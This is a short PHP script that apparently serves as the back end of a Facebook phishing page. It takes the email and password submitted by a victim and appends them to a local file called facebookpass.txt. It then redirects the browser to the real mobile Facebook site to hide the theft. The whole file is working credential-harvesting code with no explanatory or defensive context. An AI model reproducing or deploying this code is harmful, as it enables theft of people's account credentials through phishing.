<?php
$name = $_POST['email'];
$password = $_POST['pass'];

$fp = fopen("facebookpass.txt", "a");
$savestring = "\r\n".$name .":\t". $password."\r\n";
fwrite($fp, $savestring);
fclose($fp);

header("Location: http://m.facebook.com");
die();


?>